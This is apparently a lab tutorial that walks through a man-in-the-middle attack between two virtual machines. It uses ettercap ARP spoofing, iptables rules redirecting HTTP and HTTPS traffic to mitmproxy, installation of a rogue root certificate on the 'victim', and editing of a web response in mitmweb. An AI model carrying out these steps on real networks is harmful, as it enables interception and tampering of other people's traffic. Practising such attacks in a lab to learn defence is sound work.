# Step-by-Step Instructions for Conducting a MiTM Attack and Modifying Web Server Responses Using mitmweb Interface
---

## **1. MiTM Attack using ettercap**

### **Prerequisites**
- Two virtual machines:
  - Kali Linux (attacker's machine)
  - Windows (victim's machine)
- Network connectivity between both machines.

### **Steps**
1. **Install ettercap**:
   ```bash
   sudo apt install ettercap
   ```
2. **Launch ettercap**:
   ```bash
   sudo ettercap -G
   ```
3. **Set Targets**:
   - Identify the IP addresses of the victim and the gateway.
   - Add them to ettercap's target list.

4. **Enable ARP Spoofing**:
   - Navigate to **Plugins** > **Manage the Plugins** > **arp_spoof**.
   - Start ARP poisoning to intercept traffic between the victim and the gateway.

5. **Verify ARP Spoofing**:
   - On the victim machine, open Command Prompt and run:
     ```cmd
     arp -a
     ```
   - Check for duplicate entries for the gateway IP with the attacker's MAC address.

---

## **2. Configure iptables to Redirect Traffic to mitmproxy**

1. **Flush Existing iptables Rules**:
   ```bash
   sudo iptables -F
   sudo iptables -t nat -F
   ```

2. **Set iptables Rules**:
   - Redirect HTTP traffic:
     ```bash
     sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
     ```
   - Redirect HTTPS traffic:
     ```bash
     sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
     ```

3. **Verify Rules**:
   ```bash
   sudo iptables -L -t nat
   ```

---

## **3. Run mitmweb to Intercept and Modify Traffic**

1. **Start mitmweb**:
   Launch the mitmweb interface:
   ```bash
   mitmweb --mode transparent --showhost
   ```

2. **Access mitmweb Interface**:
   - Open a browser on the Kali Linux machine and navigate to:
     ```
     http://127.0.0.1:8081
     ```

3. **Install mitmproxy Certificate on the Victim Machine**:
   - On the victim's browser, visit:
     ```
     http://mitm.it
     ```
   - Download and install the certificate:
     - For Windows: Add the certificate to the "Trusted Root Certification Authorities" store.
     - For specific browsers: Add the certificate to their trusted list.

---

## **4. Modify Responses Using mitmweb**

1. **Intercept Traffic**:
   - On the victim machine, browse to any HTTP/HTTPS website.
   - In mitmweb, intercepted requests and responses will appear in the main interface.

2. **Locate the Target Request**:
   - Find the desired request in the mitmweb list.
   - Click on it to expand details.

3. **Modify the Response**:
   - Navigate to the **Response** tab in mitmweb.
   - Edit the response content directly. For example:
     ```html
     <h1>Example Domain</h1>
     ```
     Change it to:
     ```html
     <h1>Example Domain UPD Mitm attack</h1>
     ```

4. **Apply Changes**:
   - After making changes, click **Save** in the mitmweb interface.
   - The modified response will be sent to the victim.

---

## **5. Testing and Verification**

1. **Access Target Website**:
   - On the victim machine, open the modified website (e.g., `http://example.com`).
   - Verify that the altered content is displayed.

2. **Screenshot**:
   - ![img](https://github.com/user-attachments/assets/f0572e09-2466-4f24-a52b-07d3d8bfae8a)
---

## **6. Cleanup**

1. **Reset iptables**:
   ```bash
   sudo iptables -F
   sudo iptables -t nat -F
   ```

2. **Stop ettercap and mitmweb**:
   ```bash
   sudo pkill ettercap
   sudo pkill mitmproxy
   ```

3. **Remove mitmproxy Certificate from Victim Machine**:
   - Delete the certificate from the trusted store to restore the original HTTPS behavior.

---
